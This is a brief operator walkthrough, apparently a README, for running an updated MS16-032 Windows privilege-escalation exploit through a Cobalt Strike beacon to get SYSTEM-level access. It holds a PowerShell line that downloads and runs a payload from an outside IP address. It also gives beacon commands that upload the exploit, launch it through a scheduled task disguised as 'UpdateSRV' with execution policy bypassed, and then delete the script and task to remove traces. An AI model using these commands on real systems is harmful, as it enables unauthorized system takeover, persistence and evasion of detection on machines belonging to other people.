### Updated Exploit ms16-032 to get a Beacon with System Priviledges
[More Infos here] (https://pentestlab.blog/2017/04/07/secondary-logon-handle/)

You need a unpriviledged Shell/Beacon on the target. Don't forget to change the exploit for your correct ListenerName 
```
... downloadstring('http://172.16.0.5:80/a')) ...
```
### Get a Beacon with System Priviledges
```
beacon> cd C:\Windows\Temp
beacon> upload /root/tools/files/ms16-032_beacon.ps1

Now create a schtasks to run your exploit:
beacon> shell schtasks /Create /TN UpdateSRV /SC once /ST 10:10 /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass C:\Windows\Temp\ms16-032_beacon.ps1"
System beacon calls back :)

Delete Beacon:
beacon> shell del C:\Windows\Temp\ms16-032_beacon.ps1

Delete Task:
beacon> shell schtasks /Delete /TN UpdateSRV /F
```
